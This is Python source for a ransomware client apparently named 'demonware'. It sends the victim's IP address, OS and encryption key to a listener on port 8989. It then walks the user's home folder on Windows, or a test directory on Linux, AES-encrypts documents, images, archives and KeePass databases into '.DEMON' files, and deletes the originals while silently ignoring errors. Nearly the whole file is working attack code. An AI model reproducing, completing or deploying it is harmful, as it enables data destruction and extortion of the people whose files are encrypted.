#/usr/bin/env python
import os, sys, socket, string, random, hashlib, getpass, platform
from Crypto import Random
from Crypto.Cipher import AES

def getlocalip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    return s.getsockname()[0]

def gen_string(size=64, chars=string.ascii_uppercase + string.digits):
      return ''.join(random.choice(chars) for _ in range(size))

# Encryption
def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

def encrypt(message, key, key_size=256):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)

def encrypt_file(file_name, key):
    with open(file_name, 'rb') as fo:
        plaintext = fo.read()
    enc = encrypt(plaintext, key)
    with open(file_name + ".DEMON", 'wb') as fo:
        fo.write(enc)


host = '127.0.0.1'
port = 8989

#key = hashlib.sha1(gen_string().encode('utf-8')).hexdigest()
#print(len(key))
key = hashlib.md5(gen_string()).hexdigest()
platform = platform.system()

# Encrypt file that endswith
ext = ['.txt',
    '.ppt','.pptx','.doc','.docx','.gif','.jpg','.png', '.ico', '.mp3','.ogg',
    '.csv','.xls','.exe','.pdf', '.ods','.odt','.kdbx','.kdb','.mp4','.flv','.ini',
    '.iso','.zip','.tar','.tar.gz','.rar']

def get_target():
    # Encrypt on this location
    # Users home on Linux
    if platform == 'Linux':
        #target = '/home/' + getpass.getuser() + '/'
        target = '/home/lv-laptop/Documents/directories/programmeren/python/demonware/test' + '/'
        return target

    # Users home on Windows
    elif platform == 'Windows':
        target = 'C:\\Users\\' + getpass.getuser() + '\\'
        return target
    else:
        sys.exit(1) # Cannot find users home directory, skip MacOS.

def start_encrypt(target, key):
    try:
        for path, subdirs, files in os.walk(target):
            for name in files:
                for i in ext:
                    if name.endswith(i):
                        encrypt_file(os.path.join(path, name), key)
                        os.remove(os.path.join(path, name))

        #os.remove(sys.argv[0]) # destroy encrypter when finished
    except Exception as e:
        pass # continue if error

def connector():
    server = socket.socket(socket.AF_INET)
    server.settimeout(1)

    try:
        # Send Key
        server.connect((host, port))
        server.send('%s$%s$%s' % (getlocalip(), platform, key))

        start_encrypt(get_target(), key)

    except Exception as e:
        # Do not send key, encrypt anyway.
        start_encrypt(get_target(), key)

try:
    connector()
except KeyboardInterrupt:
    print("\033[1;91m[!]\033[0m Disconnected")
